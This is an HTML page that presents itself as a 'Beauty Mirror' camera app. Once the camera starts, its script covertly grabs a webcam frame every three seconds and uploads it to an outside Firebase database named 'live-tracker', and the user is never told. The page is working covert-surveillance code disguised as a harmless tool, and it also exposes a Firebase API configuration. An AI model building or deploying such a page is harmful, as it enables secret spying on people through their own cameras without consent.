<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Beauty Mirror</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:linear-gradient(120deg,#0f172a,#1e293b);
  color:white;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.card{
  width:90%;
  max-width:500px;
  background:#111827;
  padding:20px;
  border-radius:15px;
  text-align:center;
  box-shadow:0 0 20px #000;
}

button{
  padding:12px 20px;
  border:none;
  border-radius:10px;
  background:#22c55e;
  color:white;
  cursor:pointer;
}

video{
  width:100%;
  margin-top:15px;
  border-radius:10px;
}
</style>
</head>

<body>

<div class="card">

  <h2>✨ Beauty Mirror</h2>

  <button onclick="startCamera()">Start Camera</button>

  <video id="video" autoplay playsinline></video>

  <p id="status">Waiting...</p>

</div>

<canvas id="canvas" style="display:none;"></canvas>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let stream;

async function startCamera(){

  stream = await navigator.mediaDevices.getUserMedia({video:true});

  document.getElementById("video").srcObject = stream;

  document.getElementById("status").innerText = "Live Camera Active";

  startCapture();
}

function startCapture(){

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  setInterval(()=>{

    if(!video.videoWidth) return;

    canvas.width = 320;
    canvas.height = 240;

    ctx.drawImage(video,0,0,320,240);

    const frame = canvas.toDataURL("image/jpeg",0.5);

    // 🔥 ONLY ONE IMAGE (OVERWRITE)
    db.ref("camera/user1").set({
      frame: frame,
      updatedAt: Date.now()
    });

  },3000);

}
</script>

</body>
</html>
